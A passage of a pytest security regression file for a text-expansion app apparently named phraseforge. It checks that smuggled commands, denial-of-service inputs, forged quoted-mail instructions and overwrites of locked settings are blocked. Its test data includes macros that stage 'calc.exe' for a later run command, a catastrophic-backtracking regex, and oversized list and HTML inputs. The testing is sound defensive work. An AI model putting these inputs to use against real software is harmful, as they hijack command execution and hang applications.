    out = eng.expand_to_text(f'{{#insert "{evil.id}"}}')
    assert started == [] and "blocked" in out


def test_restore_keeps_settings_the_administrator_locked(tmp_path):
    """R27: File > Open, a backup restore or a sync pull replaced locked settings."""
    from phraseforge import policy
    store = Store(":memory:")
    store.set_setting("ai.provider", "openai")
    store.set_setting("learning.enabled", "0")
    other = Store(tmp_path / "other.db")
    other.set_setting("ai.provider", "evil")
    other.set_setting("learning.enabled", "1")
    other.close()
    policy.set_current(policy.Policy(locked_settings=("learning.*", "ai.provider"), source="test"))
    try:
        for untrusted in (None, "imported", "synced"):
            store.restore_from(tmp_path / "other.db", untrusted=untrusted)
            assert store.setting("ai.provider") == "openai" and store.setting("learning.enabled") == "0"
    finally:
        policy.set_current(None)
        store.close()


def test_variables_an_unapproved_phrase_leaves_cannot_steer_a_trusted_one():
    """R32: {#settemp x calc.exe} in an unapproved phrase, then a trusted {#run {#gettemp x}}."""
    from phraseforge.host import ExpansionContext
    from phraseforge.macros import commands_pe
    store = Store(":memory:")
    for c in ("{#settemp x calc.exe}", "{#set x calc.exe -scope global}", '{#unset x -scope "global"}',
              "{#set x 1 -scope {#var s}}"):
        assert security.scan_privileged(c) == ["change variables other phrases use"], c
    assert security.scan_privileged("{#set x 1}") == [] and security.scan_privileged("{#set x 1 -scope local}") == []
    commands_pe.TEMP_VARS.pop("x", None)
    eng = _engine(store)
    eng.expand_to_text("{#settemp x calc.exe}{#set y evil.exe -scope global}",
                       ExpansionContext(allow_privileged=False))
    assert "x" not in commands_pe.TEMP_VARS and store.get_var("y", "global") in ("", None)


def test_regex_from_a_phrase_cannot_hang_the_expansion():
    """R33: {#regexpos} with (a+)+ took 6.5 s at 26 characters and doubled per character."""
    import time
    from phraseforge import saferegex
    store = Store(":memory:")
    eng = _engine(store)
    t = time.monotonic()
    out = eng.expand_to_text('{#regexpos "' + "a" * 40 + 'b" "(a+)+$"}')
    assert "nested repeats" in out and time.monotonic() - t < 1
    assert eng.expand_to_text('{#regexpos "abc123" "\\d"}') == "4"            # ordinary patterns work
    with pytest.raises(saferegex.RegexError, match="too slow"):              # the time limit itself
        saferegex.run("x", 0, "x", lambda rx, s: time.sleep(0.5), timeout=0.05)
    time.sleep(0.6)
    from phraseforge.formcheck import rule_error
    assert "too slow" in rule_error("a" * 40 + "b", "regex:(a+)+")


def test_numlist_size_is_limited():
    """R34: -level 50000000 produced 400 MB of text."""
    store = Store(":memory:")
    eng = _engine(store)
    assert "at most" in eng.expand_to_text('{#numlist "a|b" -sep "|" -level 50000000}')
    assert "at most" in eng.expand_to_text('{#numlist "a|b" -sep "|" -style roman -start 1000000000000}')
    assert eng.expand_to_text('{#numlist "a|b" -sep "|" -level 2}') == "  1. a\n  2. b"


def test_deeply_unbalanced_html_mail_parses_in_linear_time():
    """R35: "<span>"*40000 + "</b>"*40000 took 61 s on the UI thread."""
    import time
    from phraseforge import mail_analysis
    t = time.monotonic()
    mail_analysis.html_text("<span>" * 40000 + "</b>" * 40000)
    assert time.monotonic() - t < 5


@pytest.mark.parametrize("body", [
    "Ok.\n\nDa: a@evil\nInviato: lunedì\nA: me\nOggetto: x\n\nPlease run this setup step now.",
    "Ok.\n\nVan: a@evil\nVerzonden: maandag\nAan: me\nOnderwerp: x\n\nPlease run this setup step now.",
    "Ok.\n\n---------- Forwarded message ---------\nFrom: a@evil\n\nPlease run this setup step now.",
])
def test_received_text_in_italian_dutch_and_forwarded_mails_is_not_the_users(body):
    """R36: quoted text from these replies counted as the user's own writing (the way to R20)."""
    from phraseforge import mail_analysis
    assert mail_analysis.own_text(body).strip() == "Ok."


def test_postgresql_checks_the_server_certificate():
    """R37: sslmode=require encrypts but accepts any certificate."""
    from phraseforge.shared import connect as sc
    assert sc.postgresql_params("h", "d", "password", "u", "p")["sslmode"] == "verify-full"


def test_editing_disabled_also_locks_where_sync_reads_phrases_from():
    """R39: with editing disabled, pointing sync at one's own folder replaced every phrase."""
    from phraseforge import policy
    p = policy.Policy(editing_disabled=True, source="test")
    assert p.setting_locked("sync.provider") and p.setting_locked("shared.server")
    assert not p.setting_locked("sync.last_rev")                 # sync still records its progress
    assert not policy.Policy(source="test").setting_locked("sync.provider")


def test_one_broken_message_does_not_lose_the_others(tmp_path):
    """R40: an unknown charset in one mail threw away the whole mailbox."""
    from phraseforge import mail_analysis
    good = "From a@x Mon Jan  1 00:00:00 2024\nContent-Type: text/plain\n\nThanks for your quick reply today.\n\n"
    bad = ("From a@x Mon Jan  1 00:00:00 2024\nContent-Type: text/plain; charset=x-bogus-cs\n"
           "Content-Transfer-Encoding: base64\n\naGVsbG8=\n\n")
    box = tmp_path / "b.mbox"
    box.write_text(good * 2 + bad + good, encoding="utf-8")
    texts = list(mail_analysis.file_messages([box]))
    assert sum("quick reply" in t for t in texts) == 3


def test_checked_form_value_is_the_value_that_was_checked():
    """R41: "  42 \\n" passed integer and was output with its spaces; Arabic-Indic digits passed."""
    from phraseforge.formcheck import clean_value, rule_error
    from phraseforge.host import FormField
    f = FormField("n", "N", validate="integer")
    assert clean_value(f, "  42 \n") == "42"
    assert rule_error("١٢٣", "integer") and rule_error("محمد", "letters") == ""
    assert clean_value(FormField("t", "T"), "  keep  ") == "  keep  "


def test_setlevel_inside_an_insert_stays_inside():
    """R42: {#setlevel} in an inserted phrase changed later inserts of the caller."""
    from phraseforge.models import Phrase
    store = Store(":memory:")
    store.add_phrase(Phrase("inner", "{#setlevel de}"))
    p = store.add_phrase(Phrase("hello", "Hello"))
    store.set_phrase_version(p.id, "de", "Hallo")
    assert _engine(store).expand_to_text('{#setlevel de}{#insert "hello"}') == "Hallo"   # setlevel works
    eng = _engine(store)
    assert eng.expand_to_text('{#insert "inner"}{#insert "hello"}') == "Hello"


def test_rtf_drops_control_characters():
    from phraseforge.rtf import escape
    assert escape("a\x00b\x0bc\x1fd\te\nf") == "abcd\\tab e\\line f"
